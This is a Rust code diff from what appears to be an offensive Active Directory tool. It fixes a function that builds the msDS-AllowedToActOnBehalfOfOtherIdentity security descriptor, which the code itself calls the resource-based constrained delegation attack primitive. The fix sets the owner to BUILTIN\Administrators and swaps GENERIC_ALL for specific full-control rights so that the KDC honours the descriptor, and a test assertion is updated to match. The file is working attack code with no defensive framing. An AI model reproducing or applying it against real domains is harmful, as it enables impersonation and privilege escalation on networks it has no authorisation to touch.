@@ -21,14 +21,19 @@ pub fn sid_to_bytes(sid: &Sid) -> Vec<u8> {
 /// Build the `msDS-AllowedToActOnBehalfOfOtherIdentity` security descriptor granting
 /// `trustee` control — the RBCD attack primitive. Self-relative SD, one allow ACE.
 pub fn build_rbcd_sd(trustee: &Sid) -> Vec<u8> {
-    let sidb = sid_to_bytes(trustee);
+    // Owner = BUILTIN\Administrators (S-1-5-32-544), matching what Windows writes; the
+    // KDC's RBCD access check wants concrete rights, so grant 0x000F01FF (full control) —
+    // a raw GENERIC_ALL bit is NOT honored in a stored DACL.
+    let owner = Sid { revision: 1, identifier_authority: 5, sub_authorities: vec![32, 544] };
+    let ownerb = sid_to_bytes(&owner);
+    let trusteeb = sid_to_bytes(trustee);
 
-    // ACCESS_ALLOWED_ACE: type 0, flags 0, size, mask=GENERIC_ALL, sid
-    let ace_size = (4 + 4 + sidb.len()) as u16;
+    // ACCESS_ALLOWED_ACE: type 0, flags 0, size, mask, sid
+    let ace_size = (4 + 4 + trusteeb.len()) as u16;
     let mut ace = vec![0x00u8, 0x00];
     ace.extend_from_slice(&ace_size.to_le_bytes());
-    ace.extend_from_slice(&0x1000_0000u32.to_le_bytes()); // GENERIC_ALL
-    ace.extend_from_slice(&sidb);
+    ace.extend_from_slice(&0x000F_01FFu32.to_le_bytes()); // full control (specific rights)
+    ace.extend_from_slice(&trusteeb);
 
     // ACL: revision 2, size, ace_count 1
     let dacl_size = (8 + ace.len()) as u16;
@@ -38,18 +43,18 @@ pub fn build_rbcd_sd(trustee: &Sid) -> Vec<u8> {
     dacl.extend_from_slice(&0u16.to_le_bytes());
     dacl.extend_from_slice(&ace);
 
-    // self-relative SD: owner = group = trustee, DACL present
+    // self-relative SD: owner = group = BA, DACL present
     let owner_off = 20u32;
-    let group_off = 20 + sidb.len() as u32;
-    let dacl_off = group_off + sidb.len() as u32;
+    let group_off = 20 + ownerb.len() as u32;
+    let dacl_off = group_off + ownerb.len() as u32;
     let mut sd = vec![1u8, 0];
     sd.extend_from_slice(&0x8004u16.to_le_bytes()); // SE_SELF_RELATIVE | SE_DACL_PRESENT
     sd.extend_from_slice(&owner_off.to_le_bytes());
     sd.extend_from_slice(&group_off.to_le_bytes());
     sd.extend_from_slice(&0u32.to_le_bytes()); // SACL offset
     sd.extend_from_slice(&dacl_off.to_le_bytes());
-    sd.extend_from_slice(&sidb); // owner
-    sd.extend_from_slice(&sidb); // group
+    sd.extend_from_slice(&ownerb); // owner
+    sd.extend_from_slice(&ownerb); // group
     sd.extend_from_slice(&dacl);
     sd
 }
@@ -67,7 +72,7 @@ mod build_tests {
         assert_eq!(aces.len(), 1);
         assert!(aces[0].is_allow());
         assert_eq!(aces[0].trustee, sid);
-        assert!(aces[0].mask.contains(AccessMask::GENERIC_ALL));
+        assert!(aces[0].mask.contains(AccessMask::WRITE_DAC)); // part of 0x000F01FF full control
     }
 }
 
